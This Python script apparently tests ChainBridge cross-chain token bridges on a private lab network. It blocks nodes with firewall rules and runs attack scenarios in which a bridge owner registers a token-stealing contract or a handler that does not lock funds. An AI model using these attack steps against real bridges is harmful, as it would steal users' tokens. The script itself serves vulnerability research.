import logging
from multiprocessing.connection import wait
from typing import List
from utils.ufw_mod import UFW, REJECT, ALLOW
from utils.conntrack_mod import ConnTrack
from model.node import Node
from model.contract import ContractTypes
from urllib.parse import urlparse
from utils.cb_wrapper import CBWrapper
from utils.resource_manager import *
from utils.cc_redeem import redeem_tokens, token_of_owner_by_index
import random
import os

# Endpoints
N0_C0_URL = "http://192.168.1.110:8545"
N0_C1_URL = "http://192.168.1.120:8545"
N0_C2_URL = "http://192.168.1.130:8545"
CHAIN0 = ['192.168.1.110', '192.168.1.111', '192.168.1.112', '192.168.1.113']
CHAIN1 = ['192.168.1.120', '192.168.1.121', '192.168.1.122', '192.168.1.123']
CHAIN2 = ['192.168.1.130', '192.168.1.131', '192.168.1.132', '192.168.1.133']
WAIT = 30
PKEY_PATH = 'resources/.secret'
# The following contracts are malicious versions of chainbridge contracts
CROSS_COIN_STEALER = "0x217B8B9Dfd8a57ea923092A9E4Ed5682718339ea"
FAKE_LOCK_HANDLER = "0xb355b0b2c88d0333B77d2D641663AF7888DC26BD"
TRUDY_ADDR = '0xD9635866Ade8E73Cc8565921F7CF95f5Be8f6D3e'


def block_connections(endpoints: List[str]):
    for ip in endpoints:
        ufw.alter_config(REJECT, ip)
        ct.drop(ip)


def unblock_connections(endpoints: List[str]):
    for ip in endpoints:
        ufw.alter_config(ALLOW, ip)


def _deploy_bridge(endpoint: Node, contracts: List[ContractTypes]):
    # Deploy new bridge on chain and save it on db
    out = cb.deploy(endpoint.node_endpoint, acc.key.hex(),
                    10000000, contracts, [acc.address], 1, endpoint.chain_id)
    save_contracts(out.stdout, endpoint.chain_id)


def _register_resource(endpoint: Node, resource_id: str, type: ContractTypes):
    # Registers resource on chain and save on local db
    dest_chain_config = True
    if not resource_id:
        resource_id = '0x'+os.getrandom(32).hex()
        dest_chain_config = False
    contracts = available_contracts(endpoint.chain_id, type)
    logging.info(contracts)
    cb.register_resource(endpoint.node_endpoint, acc.key.hex(
    ), 10000000, contracts['bridge'].address, contracts['handler'].address, resource_id, contracts['target'].address)
    save_binding(resource_id, contracts['bridge'].id,
                 contracts['handler'].id, contracts['target'].id, endpoint.chain_id)
    if dest_chain_config:
        # If this is a first deploy we are on a destination chain so we need to
        # set up the new token as burnable and add the minter
        cb.burnable(endpoint.node_endpoint, acc.key.hex(), 10000000,
                    contracts['bridge'].address, contracts['handler'].address, contracts['target'].address)
        cb.add_minter(endpoint.node_endpoint, acc.key.hex(),
                      10000000, type, contracts['handler'].address, contracts['target'].address)
    return resource_id


def deploy_bridge(type: ContractTypes):
    contracts_source = None
    contracts_dest = None
    if type == ContractTypes.ERC20:
        contracts_source = [ContractTypes.BRIDGE, ContractTypes.ERC20_HANDLER]
        contracts_dest = [ContractTypes.BRIDGE,
                          ContractTypes.ERC20_HANDLER, ContractTypes.ERC20]
    elif type == ContractTypes.ERC721:
        contracts_source = [ContractTypes.BRIDGE, ContractTypes.ERC721_HANDLER]
        contracts_dest = [ContractTypes.BRIDGE,
                          ContractTypes.ERC721_HANDLER, ContractTypes.ERC721]
    _deploy_bridge(n0, contracts_source)
    _deploy_bridge(n1, contracts_dest)
    # The vulnerability in the whole process is the fact that the user is the ralayer
    res_id_origin = _register_resource(n0, None, type)
    _register_resource(n1, res_id_origin, type)
    cb.update_config_json(n0.chain_id, type)
    cb.update_config_json(n1.chain_id, type)


def simple_token_transfer(amount: int, type: ContractTypes, source: Node, dest: Node, mint: bool = False):
    logging.info("Transferring amount %i of tokens from chain %i to chain %i" % (
        amount, source.chain_id, dest.chain_id))
    # Redeem tokens for this test
    if mint:
        redeem_tokens(source.provider, acc,
                      source.provider.toWei(amount, 'ether'), type)
    # Gets the contract addresses for this type of transfer and the associated resource id
    contracts = available_contracts(source.chain_id, type)
    res_id = available_resources(source.chain_id, contracts['target'].id)
    if type == ContractTypes.ERC721:
        # For each nft fires an approve and transfer
        for i in range(amount):
            id = token_of_owner_by_index(source.provider, acc.address, 0)
            cb.approve(source.node_endpoint, acc.key.hex(), 100000, type, id,
                       contracts['target'].address, contracts['handler'].address)
            cb.deposit(source.node_endpoint, acc.key.hex(), 100000, type, id,
                       dest.chain_id, contracts['bridge'].address, acc.address, res_id)
    elif type == ContractTypes.ERC20:
        # For erc20 we need just one request
        cb.approve(source.node_endpoint, acc.key.hex(), 100000, type, amount,
                   contracts['target'].address, contracts['handler'].address)
        cb.deposit(source.node_endpoint, acc.key.hex(), 100000, type, amount,
                   dest.chain_id, contracts['bridge'].address, acc.address, res_id)


def transfer_conn_lock(mint: bool = False):
    logging.info("Erc20 transfer with connection lock.")
    # Dest chain is unreachable (e.g. a muntain hut)
    block_connections([CHAIN1[0]])
    # Basic erc20 transfer is fired. We block our funds in our city
    simple_token_transfer(1, ContractTypes.ERC20, n0, n1, mint)
    # We go away from our city and we reach the hut
    # (i.e. source chain is unreachable, dest chain is reachable)
    block_connections(CHAIN0[1:])
    unblock_connections([CHAIN1[0]])
    cb.start_relay()
    time.sleep(WAIT)
    # Test finished, we unblock all the connections so other test doesn't have issues
    cb.stop_relay()
    unblock_connections(CHAIN0[1:])


def transfer_conn_lock_back(mint: bool = False):
    logging.info("Erc20 transfer funds backwards.")
    simple_token_transfer(1, ContractTypes.ERC20, n1, n0, mint)
    # Source chain is not reachable anymore
    block_connections([CHAIN1[0]])
    # Relay is started (since we haven't blocked the dest we don't need to unlock it).
    # For the next simulations dest will not be blocked and unlocked every time.
    # If we start the relay when we "arrive" ad destination the effect is the same.
    cb.start_relay()
    # TODO: Clearly the relay can't catch the deposit event, because source chain
    # is unreachable. We need to spin un a local node with source chain history
    # before going away.
    time.sleep(WAIT)
    cb.stop_relay()
    unblock_connections([CHAIN1[0]])


def transfer_crosscoin_stealer(mint: bool = False):
    logging.info("Erc20 transfer. Bad erc20 contract on dest chain.")
    # The owner of the bridge registers a contract wich steals user's tokens
    contracts = available_contracts(n1.chain_id, ContractTypes.ERC20)
    res_id = available_resources(n1.chain_id, contracts['target'].id)
    cb.register_resource(n1.node_endpoint, acc.key.hex(), 100000,
                         contracts['bridge'].address, contracts['handler'].address, res_id, CROSS_COIN_STEALER)
    cb.burnable(n1.node_endpoint, acc.key.hex(), 100000,
                contracts['bridge'].address, contracts['handler'].address, CROSS_COIN_STEALER)
    cb.add_minter(n1.node_endpoint, acc.key.hex(),
                  10000000, ContractTypes.ERC20, contracts['handler'].address, CROSS_COIN_STEALER)
    # Transfer token on poisoned bridge
    simple_token_transfer(1, ContractTypes.ERC20, n0, n1, mint)
    block_connections(CHAIN0[1:])
    cb.start_relay()
    time.sleep(WAIT)
    # Trudy address should increase, user shouldn't have tokens
    cb.balance(n1.node_endpoint, ContractTypes.ERC20,
               TRUDY_ADDR, CROSS_COIN_STEALER)
    cb.balance(n1.node_endpoint, ContractTypes.ERC20,
               acc.address, CROSS_COIN_STEALER)
    # Test finished, unblock and restore old bridge
    cb.register_resource(n1.node_endpoint, acc.key.hex(), 100000,
                         contracts['bridge'].address, contracts['handler'].address, res_id, contracts['target'].address)
    cb.stop_relay()
    unblock_connections(CHAIN0[1:])


def fakelock_attack(mint=False):
    logging.info(
        "Fakelock attack. The handler does not lock users funds on source chain.")
    # Pointing to the fakelock bridge.
    contracts = available_contracts(n0.chain_id, ContractTypes.ERC20)
    target_cotntract = available_contracts(n1.chain_id, ContractTypes.ERC20)['target'].address
    res_id = available_resources(n0.chain_id, contracts['target'].id)
    cb.register_resource(n0.node_endpoint, acc.key.hex(), 100000,
                         contracts['bridge'].address, FAKE_LOCK_HANDLER, res_id, contracts['target'].address)
    redeem_tokens(n0.provider, acc,
                  n0.provider.toWei(1, 'ether'), ContractTypes.ERC20)
    # Balance before the transfer with fakelock bridge
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               acc.address, contracts['target'].address)
    # User sends spend tokens
    simple_token_transfer(1, ContractTypes.ERC20, n0, n1, mint)
    block_connections(CHAIN0[1:])
    cb.start_relay()
    time.sleep(WAIT)
    # Balance on dest
    cb.balance(n1.node_endpoint, ContractTypes.ERC20,
               acc.address, target_cotntract)
    # Balance on source is the same as before
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               acc.address, contracts['target'].address)
    # Test finished, unblock and restore old bridge
    cb.stop_relay()
    unblock_connections(CHAIN0[1:])
    cb.register_resource(n0.node_endpoint, acc.key.hex(), 100000,
                         contracts['bridge'].address, contracts['handler'].address, res_id, contracts['target'].address)


def tests():
    logging.info("Starting tests.")
    # deploy_bridge(ContractTypes.ERC20)
    # simple_token_transfer(1, ContractTypes.ERC20, n0, n1, True)  # Foward
    # simple_token_transfer(1, ContractTypes.ERC20, n1, n0) # Backward
    # transfer_conn_lock()
    # transfer_conn_lock_back()
    # transfer_crosscoin_stealer()
    fakelock_attack()


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    # Configuring nodes
    n0 = Node(N0_C0_URL)
    n1 = Node(N0_C1_URL)
    #n2 = Node(N0_C2_URL)
    # Configuring test accounts
    with open(PKEY_PATH) as f:
        key = f.readline().strip()
    acc = n0.provider.eth.account.from_key(key)
    logging.info("Imported account:" + acc.address)
    # Configuring wrappers for commands execution
    cb = CBWrapper()
    ufw = UFW()
    ct = ConnTrack()
    ufw.ufw_enable()
    if cb.is_chainbridge_running():
        cb.stop_relay()
    tests()
    # Restoring firewall options
    ufw.ufw_restore_rules()
    ufw.ufw_disable()
    cb.start_relay()
